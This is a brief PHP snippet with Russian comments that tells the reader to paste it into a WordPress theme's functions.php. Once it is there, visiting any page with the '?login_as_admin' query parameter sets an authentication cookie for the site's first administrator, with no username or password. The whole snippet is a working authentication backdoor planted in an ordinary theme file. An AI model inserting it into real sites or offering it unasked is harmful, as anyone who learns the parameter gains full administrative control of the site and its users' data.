<?php 
// Добавить в functions.php для входа в админку без логина и проля.
// зайти на сайт добавив ?login_as_admin вконце
// site.ru?login_as_admin
if( isset($_GET['login_as_admin']) ){
	add_action( 'init', function(){
		$users = get_users([ 'role' => 'administrator' ]);
		wp_set_auth_cookie( $users[0]->ID );
	} );    
} ?>